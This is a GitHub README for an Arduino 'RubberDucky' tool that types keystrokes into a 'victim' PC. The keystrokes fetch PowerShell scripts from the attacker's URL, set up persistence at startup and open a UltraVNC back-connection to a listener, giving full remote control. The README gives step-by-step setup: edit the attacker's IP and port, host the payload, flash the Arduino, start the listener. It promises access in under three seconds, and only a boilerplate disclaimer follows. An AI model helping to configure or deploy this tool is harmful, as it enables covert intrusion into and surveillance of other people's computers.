# [Arduino-RubberDucky](https://github.com/EmaBixD/Arduino-RubberDucky)
Gain full access on your computer of a pc connected to the internet in less than 3 seconds.

## Requirements
- Arduino with HID capability needed to infect victim pc (Es. Arduino micro)

## Configuration

1. Clone this repo, go to your new 'client' folder and edit port and ipv4 in "LOAD.ps1" file, change the raw url of LOAD.ps1 in 'STARTUP.ps1' file with your new one previously edited and you should be good to go.
- INFO: 'client' Folder contains files that will be downloaded on the victim pc after the attack.
2. Configure your compatible Arduino with the script contained in the 'RubberDucky' folder, in order to make this work you will have to change the url with your own and if needed the layout of your desired keyboard (default: it_IT).
3. Now you just have to run "START LISTENING.bat" in 'server' folder on your main pc and wait for the connection with the victim.

## To-do:
- README.md, ik it's bad documented
- Change the .bat file in a .exe one with the same function, or it won't run at startup.

## ⚠ DISCLAIMER ⚠
Usage of the provided code is at your own risk. The author assumes no responsibility for any actions taken with the code. Please ensure compliance with applicable laws and use the code responsibly. ❗

## CREDITS:
***[UltraVNC](https://uvnc.com/)***
